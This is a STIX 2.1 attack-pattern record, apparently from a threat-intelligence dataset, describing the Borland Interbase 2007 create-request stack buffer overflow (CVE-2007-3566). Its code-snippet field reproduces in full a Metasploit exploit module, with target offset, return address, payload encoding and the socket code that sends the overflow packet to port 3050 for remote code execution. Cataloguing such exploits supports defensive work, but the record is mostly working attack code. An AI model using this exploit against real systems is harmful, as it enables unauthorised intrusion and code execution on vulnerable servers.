{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c66b2636-c5af-4ead-8ca0-5c788522b4ad",
    "created": "2024-08-14T16:45:38.918259Z",
    "modified": "2024-08-14T16:45:38.918263Z",
    "name": "Borland Interbase Create-Request Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Borland Interbase 2007. By sending a specially crafted create-request packet, a remote attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/borland_interbase.rb",
            "external_id": "borland_interbase.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3566"
        },
        {
            "source_name": "reference",
            "url": "http://dvlabs.tippingpoint.com/advisory/TPTI-07-13"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Borland Interbase Create-Request Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Borland Interbase 2007.\n        By sending a specially crafted create-request packet, a remote\n        attacker may be able to execute arbitrary code.\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          [ 'CVE', '2007-3566' ],\n          [ 'OSVDB', '38602' ],\n          [ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-07-13' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 850,\n          'BadChars' => \"\\x00\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 English All / Borland InterBase 2007',     { 'Offset' => 1266, 'Ret' => 0x1002e556 } ], # sanctuarylib.dll\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-07-24'))\n\n    register_options([Opt::RPORT(3050)])\n  end\n\n  def exploit\n    connect\n\n    # Build the exploit buffer.... It's a biggie!\n    sploit =  \"\\x00\\x00\\x00\\x14\" + \"\\x00\\x00\\x00\\x13\" + rand_text_alpha_upper(target['Offset'])\n    sploit << payload.encoded + Rex::Arch::X86.jmp_short(6) + rand_text_alpha_upper(2)\n    sploit << [target.ret].pack('V') + [0xe8, -850].pack('CV') + rand_text_alpha_upper(40000)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-07-24",
    "x_mitre_platforms": [
        "win'"
    ]
}